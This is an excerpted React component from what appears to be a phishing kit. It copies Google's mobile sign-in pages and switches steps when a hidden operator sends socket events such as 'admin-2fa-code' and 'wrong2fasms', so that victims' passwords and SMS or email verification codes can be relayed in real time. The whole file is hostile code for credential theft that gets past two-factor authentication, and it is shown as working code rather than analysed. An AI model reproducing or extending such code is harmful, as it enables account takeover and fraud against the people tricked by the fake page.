...
function GoogleSignInMobile({
  ...
  useEffect(() => {
    ...
    const handle2FACode = () => {
      console.log('[Gmail Mobile] admin-2fa-code event received');
      setIsRequestingAuth(false);
      if (passwordTimeoutRef.current) {
        clearTimeout(passwordTimeoutRef.current);
        passwordTimeoutRef.current = null;
    ...
    const handleWrong2FANumber = () => {
      console.log('[Gmail Mobile] admin-wrong-2fa-number event received');
      setIsRequestingAuth(false);
    ...
    const handleWrong2FASMS = () => {
      console.log('[Gmail Mobile] admin-wrong-2fa-sms event received');
      setIsRequestingAuth(false);
      setIsSubmittingSmsCode(false);
      setStep("2fa-sms-code");
      setSmsCode("");
  ...
  useEffect(() => {
    ...
    socketInstance.on(errorEventName, (data) => {
      ...
      if (data.type === 'badcreds') {
        ...
        console.log('[Gmail Mobile] Processing wrong2fanumber');
        setIsSubmittingSmsCode(false);
        setStep("2fa-email-code");
        setSmsCodeError("Wrong Phone number, try again");
      } else if (data.type === 'wrong2fasms') {
        console.log('[Gmail Mobile] Processing wrong2fasms');
        setIsSubmittingSmsCode(false);
        setStep("2fa-sms-code");
        setSmsCode("");
        setSmsCodeError("Invalid authentication code");
    ...
    socketInstance.on(twoFaEventName, (data) => {
      ...
      if (data.type === 'gmail') {
        ...
        console.log('[Gmail Mobile] Processing 2FA Code - going to step: 2fa-code');
        setStep("2fa-code");
      } else if (data.type === 'number') {
        console.log('[Gmail Mobile] Processing G 2FA Number - waiting for admin number');
        setEmail2faAddress("");
        setIsRequestingAuth(true);
          ...
          <div className="max-w-md mx-auto font-sans flex-1 flex flex-col w-full">
            ...
            {step === "email" ? (
              ...
              <>
                ...
                <p className="text-sm font-helvetica text-[#202124] mb-8">
                  {email2faAddress
                    ? `A text message with a 6-digit verification code was just sent to ${email2faAddress}`
                    : `A text message with a 6-digit verification code was just sent to ${lastTwoDigits ? `********${lastTwoDigits}` : "*******^**"}`}
                </p>
                ...
                <form onSubmit={handleSmsCodeSubmit}>
                  ...
                  <div className="flex justify-between items-center pb-14 pt-6">
                    <button
                      type="button"
                      onClick={handleBackToSmsOptions}
                      className="text-[#0b57d0] text-sm font-medium hover:underline"
